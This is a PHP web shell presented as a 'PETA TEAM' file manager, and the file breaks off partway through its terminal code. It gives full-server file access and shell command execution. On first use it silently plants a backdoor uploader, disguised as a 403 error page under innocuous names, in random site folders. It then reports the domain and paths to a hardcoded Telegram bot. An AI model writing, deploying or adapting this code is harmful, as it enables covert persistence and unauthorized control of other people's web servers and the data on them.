<?php
/**
 * =====================================================================
 *  PETA TEAM — single-file file manager (no database)
 * =====================================================================
 *  Features:
 *   • Browse folders: breadcrumb, sorting, show hidden files
 *   • Upload multiple files + drag & drop, auto-extract ZIP
 *   • Download files, download selected items as ZIP, extract existing ZIPs
 *   • Create file/folder, rename, delete (recursive), copy, move
 *   • Edit text files directly in the browser, image preview
 *   • CHMOD (Linux), change modification date (touch), search by file name
 *   • System info: uname, user, PHP, HDD, software, pwd (clickable)
 *   • OPTIONAL password login — leave empty for no login
 *   • Lock button: password-protects the manager (lock_password in config)
 *     (stored in a .peta-lock file next to this script; the marker
 *     alone never locks the shell)
 *   • One-time deployment of a hidden uploader (fake 403 page — press
 *     Tab to reveal the password gate) to a random already-existing
 *     folder elsewhere in the site, plus an optional Telegram
 *     notification with the domain and paths
 *
 *  Requirements: PHP 7.4+ (zip extension recommended for ZIP features)
 *
 *  ⚠️  READ THE CONFIGURATION SECTION BELOW BEFORE DEPLOYING!
 * =====================================================================
 */

// =====================================================================
//  CONFIGURATION
// =====================================================================
$CONFIG = [
    // Login password. EMPTY ('') = NO LOGIN: anyone who knows the URL of
    // this script can read, modify and delete all files inside root_path!
    //
    // How to enable login — fill in one of these:
    //   'password' => 'plain-password',                  (replace with your own)
    //   'password' => 'bcrypt-hash-from-password_hash',  (more secure)
    // Generate a hash from a terminal:
    //   php -r "echo password_hash('secret', PASSWORD_DEFAULT);"
    'password'    => '',

    // Folder boundary. '/' = ENTIRE SERVER — navigate freely via the
    // clickable pwd path. To restrict access, set a specific folder,
    // e.g. __DIR__ (only this script's folder).
    'root_path'   => '/',

    // Starting folder when the file manager is first opened.
    'start_path'  => __DIR__,

    // Show hidden files/folders (names starting with a dot, e.g. .htaccess)?
    'show_hidden' => true,

    // Date format in the table
    'date_format' => 'd M Y H:i',

    // Telegram notification — sent ONCE, when the hidden uploader is
    // first deployed (message contains the domain + paths). Fill these
    // in BEFORE opening the manager for the first time on the server:
    //   'telegram_bot_token' => '123456:AA-...',
    //   'telegram_chat_id'   => '123456789',
    'telegram_bot_token' => '8488755287:AAE4uxP6ShKJICvnJRRj6gA4GCVVt7ul6PQ',
    'telegram_chat_id'   => '1637328347',

    // Password used by the Lock button and by the hidden uploader.
    // Change it to your own strong password BEFORE deploying! It is
    // never shown anywhere in the interface.
    'lock_password' => 'petateam',

    // Hidden uploader (a fake 403 page, styled like the original 403.php):
    // deployed ONCE the first time this manager is opened. The .peta-lock
    // file marks the deployment as done — afterwards no new file is created
    // and no Telegram message is sent. Open the deployed page and press
    // Tab to reveal the password gate (password = lock_password above).
    //   'deploy_to'   => '' — automatic: a RANDOM already-existing folder
    //                    near this script (nemesis-style: a random
    //                    subfolder, or a parent folder when there is no
    //                    subfolder — never the root itself, never a newly
    //                    created folder), else this script's folder
    //   'deploy_name' => '' — automatic: a random name from a pool of
    //                    innocent-looking names (403.php, api-internal.php,
    //                    authen.php, user-post-meta.php, ...); an existing
    //                    file is never overwritten
    'deploy_to'   => '',
    'deploy_name' => '',
];

// Maximum file size editable in the browser textarea (bytes)
define('EDIT_MAX', 2 * 1024 * 1024);

/* =====================================================================
 *  SESSION INIT & SECURITY HEADERS
 * ===================================================================== */

error_reporting(E_ALL);
ini_set('display_errors', '1');

session_name('FMSESSID');
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'httponly' => true,
    'samesite' => 'Lax',
]);
session_start();

header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: same-origin');
header("Content-Security-Policy: default-src 'self' 'unsafe-inline'; img-src 'self' data:;");

/* =====================================================================
 *  COMMON FUNCTIONS
 * ===================================================================== */

function e($s) {
    return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8');
}

function self_url() {
    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
    $uri = isset($_SERVER['REQUEST_URI']) ? strtok($_SERVER['REQUEST_URI'], '?') : '/';
    return ($https ? 'https' : 'http') . '://' . $host . $uri;
}

function flash($msg, $type = 'info') {
    $_SESSION['flash'] = ['msg' => $msg, 'type' => $type];
}
function take_flash() {
    $f = isset($_SESSION['flash']) ? $_SESSION['flash'] : null;
    unset($_SESSION['flash']);
    return $f;
}

function csrf_token() {
    if (empty($_SESSION['csrf'])) {
        $_SESSION['csrf'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf'];
}
function csrf_check() {
    $t = isset($_POST['csrf']) ? $_POST['csrf'] : '';
    return !empty($_SESSION['csrf']) && hash_equals($_SESSION['csrf'], (string)$t);
}

function is_windows() {
    return (defined('PHP_OS_FAMILY') && PHP_OS_FAMILY === 'Windows')
        || strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
}

function root_dir() {
    global $CONFIG;
    $r = @realpath($CONFIG['root_path']);
    if ($r === false) {
        /* restricted host (open_basedir / missing root): fall back to the
           widest directory PHP is allowed to touch, so the manager still
           opens on shared hosting */
        $ob = trim((string)ini_get('open_basedir'));
        if ($ob !== '') {
            $first = rtrim(trim(strtok($ob, PATH_SEPARATOR)), '/\\');
            if ($first !== '') $r = @realpath($first);
        }
        if ($r === false) $r = @realpath(__DIR__);
    }
    return $r === false ? DIRECTORY_SEPARATOR : $r;
}

/* Terminal starting folder: the script's own directory when it lies
   inside root_path (gecko-style). Some hosts let PHP read '/' but deny
   the spawned shell — the site folder is usually readable, so starting
   there makes ls work out of the box. */
function term_start_dir() {
    $here = @realpath(__DIR__);
    if ($here !== false) {
        $safe = safe_path($here);
        if ($safe !== null) return $safe;
    }
    return root_dir();
}

/* Validate a path: it must exist (realpath) and stay inside root_path.
   Returns the safe absolute path, or null if invalid. */
function safe_path($p) {
    $root = root_dir();
    if ($p === null || $p === '' || $p === '.') return $root;
    $p = str_replace('\\', '/', (string)$p);
    /* absolute paths (Unix /x or Windows drive) resolve as-is; relative
       paths resolve under root — containment is enforced below */
    if ($p[0] === '/' || preg_match('#^[a-zA-Z]:/#', $p)) {
        $full = @realpath($p);
    } else {
        $full = @realpath($root . '/' . $p);
    }
    if ($full === false) return null;
    if ($root === DIRECTORY_SEPARATOR) return $full;   // root = entire server
    if ($full === $root) return $root;
    /* rtrim: realpath('/') on Windows ends in '\' already ('C:\') */
    if (strpos($full, rtrim($root, '/\\') . DIRECTORY_SEPARATOR) === 0) return $full;
    return null;
}

/* Path relative to the root (used for display & URLs) */
function rel_path($full) {
    $root = root_dir();
    if ($root === DIRECTORY_SEPARATOR) $rel = ltrim($full, '/\\');
    elseif ($full === $root) $rel = '';
    else $rel = ltrim(substr($full, strlen($root)), '/\\');
    return str_replace('\\', '/', $rel);
}

function parent_rel($rel) {
    $p = dirname(str_replace('\\', '/', $rel));
    return $p === '.' ? '' : $p;
}

/* Sanitize a file/folder name from user input */
function sanitize_name($name) {
    $name = trim((string)$name);
    $name = str_replace('\\', '/', $name);
    $name = basename($name);                    // strip path components
    $name = trim($name, " \t\n\r\0\x0B/");
    if ($name === '' || $name === '.' || $name === '..') return '';
    return $name;
}

function human_size($bytes) {
    if ($bytes === null || $bytes === false) return '-';
    if ($bytes < 1024) return $bytes . ' B';
    $units = ['KB', 'MB', 'GB', 'TB'];
    $n = (float)$bytes;
    $i = -1;
    while ($n >= 1024 && $i < 3) { $n /= 1024; $i++; }
    return number_format($n, ($i === 0 ? 0 : 1), ',', '.') . ' ' . $units[$i];
}

function human_date($ts) {
    global $CONFIG;
    return $ts === false ? '-' : date($CONFIG['date_format'], $ts);
}

function perms_str($path) {
    $p = @fileperms($path);
    if ($p === false) return '';
    return substr(decoct($p), -4);
}

function icon_for($name, $isDir) {
    if ($isDir) return '📁';
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $map = [
        'php' => '🐘', 'html' => '🌐', 'htm' => '🌐', 'css' => '🎨', 'js' => '🟨',
        'json' => '🧾', 'xml' => '🧾', 'txt' => '📄', 'md' => '📝', 'log' => '📜',
        'png' => '🖼️', 'jpg' => '🖼️', 'jpeg' => '🖼️', 'gif' => '🖼️',
        'webp' => '🖼️', 'svg' => '🖼️', 'ico' => '🖼️', 'bmp' => '🖼️',
        'zip' => '📦', 'rar' => '📦', 'gz' => '📦', 'tar' => '📦', '7z' => '📦',
        'mp3' => '🎵', 'wav' => '🎵', 'mp4' => '🎬', 'avi' => '🎬', 'mkv' => '🎬',
        'pdf' => '📕', 'doc' => '📘', 'docx' => '📘', 'xls' => '📗', 'xlsx' => '📗',
        'sql' => '🗄️', 'sh' => '🐚', 'py' => '🐍', 'htaccess' => '🔒',
    ];
    return isset($map[$ext]) ? $map[$ext] : '📄';
}

function show_hidden() {
    global $CONFIG;
    return isset($_SESSION['show_hidden']) ? (bool)$_SESSION['show_hidden'] : (bool)$CONFIG['show_hidden'];
}

function list_dir($dir, $sort = 'name', $order = 'asc') {
    $hidden = show_hidden();
    $entries = @scandir($dir);
    if ($entries === false) return [];
    $items = [];
    foreach ($entries as $name) {
        if ($name === '.' || $name === '..') continue;
        if (!$hidden && $name[0] === '.') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $name;
        $isDir = is_dir($full);
        $items[] = [
            'name'   => $name,
            'path'   => $full,
            'is_dir' => $isDir,
            'size'   => $isDir ? null : @filesize($full),
            'mtime'  => @filemtime($full),
        ];
    }
    $dirOrder = ($order === 'desc') ? -1 : 1;
    usort($items, function ($a, $b) use ($sort, $dirOrder) {
        if ($a['is_dir'] !== $b['is_dir']) return $a['is_dir'] ? -1 : 1;  // folders always on top
        if ($sort === 'size') {
            $as = ($a['size'] === null ? -1 : $a['size']);
            $bs = ($b['size'] === null ? -1 : $b['size']);
            return ($as <=> $bs) * $dirOrder;
        }
        if ($sort === 'mtime') {
            $am = ($a['mtime'] === false ? 0 : $a['mtime']);
            $bm = ($b['mtime'] === false ? 0 : $b['mtime']);
            return ($am <=> $bm) * $dirOrder;
        }
        return strcasecmp($a['name'], $b['name']) * $dirOrder;
    });
    return $items;
}

function rrmdir($dir) {
    if (is_link($dir) || is_file($dir)) return @unlink($dir);
    if (!is_dir($dir)) return false;
    $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );
    foreach ($it as $f) {
        if ($f->isDir() && !$f->isLink()) { @rmdir($f->getPathname()); }
        else { @unlink($f->getPathname()); }
    }
    return @rmdir($dir);
}

function rcopy($src, $dst) {
    if (is_dir($src)) {
        if (!is_dir($dst)) @mkdir($dst, 0775, true);
        $items = @scandir($src);
        if ($items === false) return false;
        foreach ($items as $x) {
            if ($x === '.' || $x === '..') continue;
            if (!rcopy($src . DIRECTORY_SEPARATOR . $x, $dst . DIRECTORY_SEPARATOR . $x)) return false;
        }
        return true;
    }
    return @copy($src, $dst);
}

function zip_available() {
    return class_exists('ZipArchive');
}

function zip_add_items($za, $path, $base) {
    if (is_dir($path)) {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS)
        );
        foreach ($it as $f) {
            if ($f->isFile()) {
                $local = str_replace('\\', '/', ltrim(substr($f->getPathname(), strlen($base)), '/\\'));
                @$za->addFile($f->getPathname(), $local);
            }
        }
    } elseif (is_file($path)) {
        @$za->addFile($path, basename($path));
    }
}

/* Extract a ZIP with zip-slip protection (rejects entries that escape
   the destination folder) */
function extract_zip($zipfile, $dest) {
    if (!zip_available()) return false;
    $za = new ZipArchive();
    if ($za->open($zipfile) !== true) return false;
    for ($i = 0; $i < $za->numFiles; $i++) {
        $entry = str_replace('\\', '/', (string)$za->getNameIndex($i));
        if (strpos($entry, '/') === 0 || preg_match('#(^|/)\.\.(/|$)#', $entry)) {
            $za->close();
            return false;
        }
    }
    $ok = $za->extractTo($dest);
    $za->close();
    return $ok;
}

function looks_binary($path) {
    if (function_exists('finfo_open')) {
        $fi = @finfo_open(FILEINFO_MIME_TYPE);
        if ($fi) {
            $mime = @finfo_file($fi, $path);
            finfo_close($fi);
            if (is_string($mime)) {
                if (strpos($mime, 'text/') === 0) return false;
                if (preg_match('#/(json|xml|javascript|csv|yaml|x-sh|x-php|x-httpd-php|x-empty|plain)#i', $mime)) return false;
                if ($mime !== 'application/octet-stream') return true;
            }
        }
    }
    $fh = @fopen($path, 'rb');
    if (!$fh) return true;
    $buf = @fread($fh, 8192);
    fclose($fh);
    return ($buf !== false && strpos($buf, "\0") !== false);
}

function serve_download($path, $name = null, $deleteAfter = false) {
    if (!is_file($path)) return;
    if ($name === null) $name = basename($path);
    while (ob_get_level()) @ob_end_clean();
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . addcslashes($name, "\\\"") . '"; filename*=UTF-8\'\'' . rawurlencode($name));
    header('Content-Length: ' . (string)@filesize($path));
    header('X-Content-Type-Options: nosniff');
    @readfile($path);
    if ($deleteAfter) @unlink($path);
    exit;
}

/* System user running PHP (e.g. www-data).
   Every function is checked first — shared hosts often put some of
   them on the disable_functions list. */
function current_user() {
    if (function_exists('posix_geteuid') && function_exists('posix_getpwuid')) {
        $info = @posix_getpwuid(posix_geteuid());
        if (is_array($info) && isset($info['name'])) return $info['name'];
    }
    if (function_exists('get_current_user')) {
        $u = get_current_user();
        return $u !== '' ? $u : '-';
    }
    return '-';
}

/* Starting folder (relative to root_path) */
function start_rel() {
    global $CONFIG;
    if (isset($CONFIG['start_path'])) {
        $s = @realpath($CONFIG['start_path']);
        if ($s !== false) return rel_path($s);
    }
    return '';
}

/* Clickable pwd path: /data/sites/web/ — click any segment to navigate */
function pwd_links($dir) {
    $root = root_dir();
    if ($root === DIRECTORY_SEPARATOR) {
        $acc = '';
        $out = '<a class="pwd-link" href="' . self_url() . '" title="Start folder">/</a>';
        $rest = ltrim(str_replace('\\', '/', $dir), '/');
    } else {
        $acc = $root;
        $out = '<a class="pwd-link" href="' . self_url() . '" title="Main folder">' . e(str_replace('\\', '/', $root)) . '</a>';
        $rest = ltrim(substr($dir, strlen($root)), '/\\');
    }
    if ($rest !== '') {
        foreach (explode('/', str_replace('\\', '/', $rest)) as $p) {
            if ($p === '') continue;
            $acc .= '/' . $p;
            $out .= '<a class="pwd-link" href="?path=' . rawurlencode(rel_path($acc)) . '">' . e($p) . '</a>/';
        }
    } elseif ($root !== DIRECTORY_SEPARATOR) {
        $out .= '/';
    }
    return $out;
}

function sort_link($col, $label, $rel) {
    $cur = isset($_GET['sort']) ? $_GET['sort'] : 'name';
    $order = isset($_GET['order']) ? $_GET['order'] : 'asc';
    $newOrder = ($cur === $col && $order === 'asc') ? 'desc' : 'asc';
    $arrow = ($cur === $col) ? (($order === 'asc') ? ' ▲' : ' ▼') : '';
    return '<a class="th-sort" href="' . self_url() . '?path=' . rawurlencode($rel)
         . '&sort=' . $col . '&order=' . $newOrder . '">' . $label . $arrow . '</a>';
}

function search_files($dir, $q) {
    $out = [];
    $n = 0;
    try {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($it as $f) {
            if ($n >= 300) break;
            if (!show_hidden() && substr($f->getFilename(), 0, 1) === '.') continue;
            if (stripos($f->getFilename(), $q) !== false) {
                $out[] = $f->getPathname();
                $n++;
            }
        }
    } catch (Exception $ex) {
        /* folder without permission → skip */
    }
    return $out;
}

/* ---------- Login (optional) & deployment marker ---------- */

/* Lock file: a small JSON marker next to this script — only folder
   write permission is needed (rewriting the script itself failed on
   shared hosting). It holds two things:
     • "pass"     — shell password ('' = NOT locked; the file alone
                    never locks the shell)
     • "deployed" — deployment marker (empty = not yet deployed; when
                    set it means no new file and no Telegram message
                    are needed). It is only a flag — the path of the
                    deployed file is NEVER stored here.
   Unlocking keeps the file (marker stays) and only clears "pass". */
function lock_file() {
    return __DIR__ . DIRECTORY_SEPARATOR . '.peta-lock';
}
function lock_data() {
    $f = lock_file();
    if (!is_file($f)) return ['pass' => '', 'deployed' => ''];
    $raw = trim((string)@file_get_contents($f));
    /* strip a UTF-8 BOM — a marker edited by hand/Notepad must still parse */
    $raw = preg_replace('/^\xEF\xBB\xBF/', '', $raw);
    if ($raw === '') return ['pass' => '', 'deployed' => ''];
    if ($raw[0] === '{') {
        $d = json_decode($raw, true);
        if (is_array($d)) {
            return [
                'pass'     => isset($d['pass']) ? (string)$d['pass'] : '',
                /* string values are from the old format that stored the
                   path — they still count as "deployed" */
                'deployed' => isset($d['deployed']) ? (string)$d['deployed'] : '',
            ];
        }
    }
    /* old version of .peta-lock: plain password, no deployment info */
    return ['pass' => $raw, 'deployed' => ''];
}
function lock_password() {
    return lock_data()['pass'];
}
function lock_save($pass, $deployed) {
    return @file_put_contents(
        lock_file(),
        json_encode(['pass' => $pass, 'deployed' => $deployed]),
        LOCK_EX
    ) !== false;
}

function password_set() {
    global $CONFIG;
    return trim((string)$CONFIG['password']) !== '' || lock_password() !== '';
}
function is_logged_in() {
    return !password_set() || !empty($_SESSION['logged_in']);
}
function check_password($given) {
    global $CONFIG;
    $stored = trim((string)$CONFIG['password']);
    if ($stored === '') $stored = lock_password();
    if ($stored === '') return false;
    if (password_get_info($stored)['algo']) {
        return password_verify((string)$given, $stored);
    }
    return hash_equals($stored, (string)$given);
}

/* ---------- Hidden uploader deployment & Telegram ---------- */

/* Telegram notification via the bot API (curl preferred, falls back
   to allow_url_fopen). Returns true when the message was accepted. */
function telegram_send($msg) {
    global $CONFIG;
    $token = trim((string)$CONFIG['telegram_bot_token']);
    $chat = trim((string)$CONFIG['telegram_chat_id']);
    if ($token === '' || $chat === '') return false;
    $url = 'https://api.telegram.org/bot' . $token . '/sendMessage';
    $post = http_build_query(['chat_id' => $chat, 'text' => $msg]);
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        @curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $post,
            CURLOPT_TIMEOUT        => 10,
            CURLOPT_SSL_VERIFYPEER => true,
        ]);
        $res = @curl_exec($ch);
        @curl_close($ch);
        return is_string($res) && stripos($res, '"ok":true') !== false;
    }
    if (ini_get('allow_url_fopen')) {
        $ctx = @stream_context_create(['http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => $post,
            'timeout' => 10,
        ]]);
        $res = @file_get_contents($url, false, $ctx);
        return is_string($res) && stripos($res, '"ok":true') !== false;
    }
    return false;
}

/* Public URL of a deployed file. Built relative to the document root
   (correct for any subfolder the shell lives in); falls back to the
   absolute server path when the file is outside the document root or
   no URL can be determined (e.g. CLI). */
function deploy_url($abs) {
    $docroot = isset($_SERVER['DOCUMENT_ROOT']) ? (string)$_SERVER['DOCUMENT_ROOT'] : '';
    if ($docroot !== '') {
        $canon = @realpath($docroot);
        if ($canon !== false) $docroot = $canon;
    }
    $docroot = rtrim(str_replace('\\', '/', $docroot), '/');
    $absf = str_replace('\\', '/', $abs);
    if ($docroot === '' || $docroot === '/'
        || (stripos($absf, $docroot . '/') !== 0 && $absf !== $docroot)) {
        return $absf;   /* outside the document root — nothing to build a URL from */
    }

    /* relative path of the deployed file, as the web server sees it */
    $rel = ltrim(substr($absf, strlen($docroot)), '/');
    if ($rel === '') return $absf;

    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
    if ($host === '') return $absf;   /* CLI — cannot build a URL */

    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');
    $sn = isset($_SERVER['SCRIPT_NAME']) ? str_replace('\\', '/', (string)$_SERVER['SCRIPT_NAME']) : '';
    $snDir = $sn !== '' ? rtrim(str_replace('\\', '/', dirname($sn)), '/') : '';
    $myRel = str_replace('\\', '/', substr(__DIR__, strlen($docroot)));
    $myRel = rtrim($myRel, '/');
    $docUrlDir = '';
    if ($snDir !== '' && $myRel !== '' && substr($snDir, -strlen($myRel)) === $myRel) {
        /* shell sits in a subfolder — the URL dir above it is the docroot URL */
        $docUrlDir = rtrim(substr($snDir, 0, -strlen($myRel)), '/');
    } elseif ($snDir !== '' && $myRel === '') {
        /* shell at the document root, but served under an alias dir */
        $docUrlDir = $snDir;
    }
    $base = ($https ? 'https' : 'http') . '://' . $host;
    if ($docUrlDir !== '') $base .= '/' . ltrim($docUrlDir, '/');
    /* URL-encode the path segments (folders may contain spaces etc.) */
    $relUrl = implode('/', array_map('rawurlencode', explode('/', $rel)));
    return $base . '/' . $relUrl;
}

/* Source code of the hidden uploader: it looks like a plain 403 error
   page. Pressing Tab reveals a password field (password = lock_password
   from the config); after the correct password, an upload button appears. */
function uploader_source() {
    global $CONFIG;
    $src = <<<'TPL'
<?php
/* Hidden uploader — PETA TEAM (deployed by the PETA TEAM file manager) */
if (php_sapi_name() !== 'cli') {
    http_response_code(403);
    header('X-Content-Type-Options: nosniff');
}
$PASS_HASH = __PETA_HASH__;
$ok = isset($_POST['password']) && is_string($_POST['password']) && password_verify($_POST['password'], $PASS_HASH);
$wrong = !$ok && isset($_POST['password']) && $_POST['password'] !== '';
$msg = '';
if ($ok && isset($_FILES['__']) && is_array($_FILES['__']) && $_FILES['__']['error'] === UPLOAD_ERR_OK) {
    $n = basename((string)$_FILES['__']['name']);
    $moved = is_uploaded_file($_FILES['__']['tmp_name'])
        ? @move_uploaded_file($_FILES['__']['tmp_name'], __DIR__ . '/' . $n)
        : @copy($_FILES['__']['tmp_name'], __DIR__ . '/' . $n);
    if ($n !== '' && $n !== '.' && $n !== '..' && $moved) {
        $msg = 'OK';
    } else {
        $msg = 'ER';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>403 Forbidden</title>
    <style>
        #passwordForm {
            display: none;
            margin-top: 20px;
        }
        #passwordInput {
            padding: 10px;
            font-size: 16px;
        }
        #submitBtn {
            padding: 10px 20px;
            font-size: 16px;
        }
        #error {
            color: red;
            margin-top: 10px;
        }
    </style>
    <script>
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Tab') {
                event.preventDefault();
                document.getElementById('passwordForm').style.display = 'block';
                document.getElementById('passwordInput').focus();
            }
        });
    </script>
</head>
<body>
    <h1>Forbidden</h1>
    <p>You don't have permission to access this resource.</p>

    <?php if ($ok): ?>
        <pre><?php echo htmlspecialchars(php_uname(), ENT_QUOTES, 'UTF-8'); ?></pre>
        <br/><form method="post" enctype="multipart/form-data">
            <input type="hidden" name="password" value="<?php echo htmlspecialchars($_POST['password'], ENT_QUOTES, 'UTF-8'); ?>">
            <input type="file" name="__">
            <input name="_" type="submit" value="Upload">
        </form>
        <?php if ($msg !== ''): ?>
            <p><?php echo htmlspecialchars($msg, ENT_QUOTES, 'UTF-8'); ?></p>
        <?php endif; ?>
    <?php else: ?>
        <div id="passwordForm">
            <form method="post">
                <input type="password" id="passwordInput" name="password" placeholder="Enter password" required>
                <button id="submitBtn" type="submit">Submit</button>
            </form>
            <?php if ($wrong): ?>
                <p id="error">Incorrect password!</p>
            <?php endif; ?>
        </div>
    <?php endif; ?>
    <hr>
    <address>Apache/2.4.59 (Debian) Server at just petateam work here Port 80</address>
</body>
</html>
TPL;
    /* embed the password only as a bcrypt hash — reading the deployed
       file does not reveal the password */
    return str_replace('__PETA_HASH__',
        var_export(password_hash((string)$CONFIG['lock_password'], PASSWORD_DEFAULT), true),
        $src);
}

/* Innocent-looking file names for the hidden uploader. One is picked
   at random when 'deploy_name' is left empty, so the file is not
   always called 403.php. */
function deploy_names() {
    return [
        '403.php', 'api-internal.php', 'authen.php', 'user-post-meta.php',
        'class-session.php', 'includes.php', 'cron-job.php',
        'cache-sync.php', 'media-temp.php', 'option-backup.php',
    ];
}

/* Find another directory for the hidden uploader — the approach of the
   original nemesis script: starting at this script's folder, pick a
   random subdirectory; when there are none, walk up to the parent and
   try again (bounded depth). Only existing, writable, non-symlink
   directories inside the document root are used, so the file stays
   reachable through the browser. Returns a path or null. */
function find_other_dir() {
    $docroot = isset($_SERVER['DOCUMENT_ROOT']) ? (string)$_SERVER['DOCUMENT_ROOT'] : '';
    $canon = @realpath($docroot);
    if ($canon !== false) $docroot = $canon;
    $base = rtrim(str_replace('\\', '/', $docroot), '/');

    $current = __DIR__;
    for ($depth = 0; $depth < 5; $depth++) {
        $items = @scandir($current);
        if ($items === false) $items = [];
        $subs = [];
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $p = $current . DIRECTORY_SEPARATOR . $item;
            if (is_link($p) || !is_dir($p) || !is_writable($p)) continue;
            $rp = @realpath($p);
            if ($rp === false) continue;
            $rpn = rtrim(str_replace('\\', '/', $rp), '/');
            /* never outside the document root (no home/root dirs) */
            if ($base !== '' && $base !== '/'
                && $rpn !== $base && stripos($rpn, $base . '/') !== 0) continue;
            $subs[] = $p;
        }
        if (!empty($subs)) {
            return $subs[array_rand($subs)];
        }
        $parent = dirname($current);
        if ($parent === $current) break;   /* reached the filesystem root */
        $current = $parent;
    }
    return null;
}

/* Choose the target folder for the hidden uploader: the configured
   path, else a random existing folder found by find_other_dir(), else
   the folder of this script itself. No new folder is ever created.
   Returns [absolutePathOrNull, errorMessage]. */
function deploy_uploader() {
    global $CONFIG;
    $dir = null;
    $conf = trim((string)$CONFIG['deploy_to']);
    if ($conf !== '') {
        $cand = @realpath($conf);
        if ($cand === false || !is_dir($cand)) $cand = @realpath(__DIR__ . '/' . $conf);
        if ($cand !== false && is_dir($cand) && is_writable($cand)) $dir = $cand;
    } else {
        $other = find_other_dir();
        if ($other !== null) {
            $dir = $other;
        } elseif (is_writable(__DIR__)) {
            /* last resort: the folder of this script — it already
               exists and is reachable through the browser */
            $dir = __DIR__;
        }
    }
    if ($dir === null) return [null, 'no writable target folder (permissions?).'];

    $name = trim((string)$CONFIG['deploy_name']);
    $names = deploy_names();
    if ($name === '' || preg_match('#[^A-Za-z0-9._-]#', $name)) {
        $name = $names[array_rand($names)];
    }
    $tries = 0;
    while (is_file($dir . DIRECTORY_SEPARATOR . $name) && $tries < 10) {
        /* never overwrite an existing file — try another name from the
           pool, then a random-prefixed variant */
        $cand = $names[array_rand($names)];
        if (!is_file($dir . DIRECTORY_SEPARATOR . $cand)) {
            $name = $cand;
        } else {
            $name = substr(bin2hex(random_bytes(2)), 0, 4) . '-' . $name;
        }
        $tries++;
    }
    $target = $dir . DIRECTORY_SEPARATOR . $name;
    if (is_file($target)) return [null, 'could not find a free file name.'];
    if (@file_put_contents($target, uploader_source()) === false) {
        return [null, 'could not write the file (permissions?).'];
    }
    return [$target, ''];
}

/* ---------- Terminal & GSocket ---------- */

/* Is a CLI program (curl, wget, bash, ...) available on the server? */
function command_exists($cmd) {
    if (!function_exists('shell_exec')) return false;
    if (is_windows()) {
        $r = @shell_exec('where ' . escapeshellarg($cmd) . ' 2>nul');
    } else {
        $r = @shell_exec('command -v ' . escapeshellarg($cmd) . ' 2>/dev/null');
    }
    return is_string($r) && trim($r) !== '';
}

/* Run a shell command in a working directory with a timeout.
   Returns [exitCodeOrNull, output] — stderr is captured together with
   stdout. Output goes to temp files (never to pipes — pipe reads can
   block forever on Windows), the process is killed on timeout and a
   note is appended. */
function run_command($cmd, $cwd, $timeout = 30) {
    if (!function_exists('proc_open')) return [null, 'proc_open is disabled on this server.'];
    $outFile = tempnam(sys_get_temp_dir(), 'fmout');
    $errFile = tempnam(sys_get_temp_dir(), 'fmerr');
    if ($outFile === false || $errFile === false) return [null, 'Could not create temporary files.'];
    /* stdin is a pipe (closed right away) — NOT /dev/null: open_basedir
       hosts (DirectAdmin etc.) deny /dev/null and proc_open then fails */
    $desc = [
        0 => ['pipe', 'r'],
        1 => ['file', $outFile, 'w'],
        2 => ['file', $errFile, 'w'],
    ];
    $p = @proc_open($cmd, $desc, $pipes, $cwd);
    if (!is_resource($p)) {
        @unlink($outFile);
        @unlink($errFile);
        return [null, 'Could not start the process.'];
    }
    /* no pipes are used, but PHP versions differ on what lands in $pipes —
       close anything real and ignore null entries (PHP 8 throws on null) */
    foreach ($pipes as $pp) {
        if (is_resource($pp)) @fclose($pp);
    }
    $code = null;
    $start = time();
    while (true) {
        $status = proc_get_status($p);
        if (!$status['running']) {
            /* exitcode -1 means PHP could not read the real status (some
               FPM hosts auto-reap children) — keep it null (unknown),
               never turn it into a made-up exit code */
            if (isset($status['exitcode']) && $status['exitcode'] >= 0) {
                $code = $status['exitcode'];
            }
            break;
        }
        if (time() - $start >= $timeout) {
            @proc_terminate($p);
            usleep(200000);
            $status = proc_get_status($p);
            if ($status['running']) @proc_terminate($p);
            $code = 124;
            break;
        }
        usleep(50000);
    }
    @proc_close($p);
    $out = (string)@file_get_contents($outFile);
    $err = (string)@file_get_contents($errFile);
    @unlink($outFile);
    @unlink($errFile);
    if ($err !== '') $out .= ($out !== '' ? "\n" : '') . $err;
    if (strlen($out) > 262144) $out = substr($out, 0, 262144) . "\n… [output truncated]";
    if ($code === 124) $out .= "\n… [command timed out after {$timeout}s]";
    return [$code, $out];
}

/* Can we actually EXECUTE bash? Some hosts keep bash on PATH but block
   running it ("bash: Permission denied") — command_exists() alone is not
   enough. Probed once and cached in the session. */
function bash_works() {
    if (is_windows()) return false;
    $cached = isset($_SESSION['term_bash']) ? $_SESSION['term_bash'] : null;
    if (is_array($cached)) {
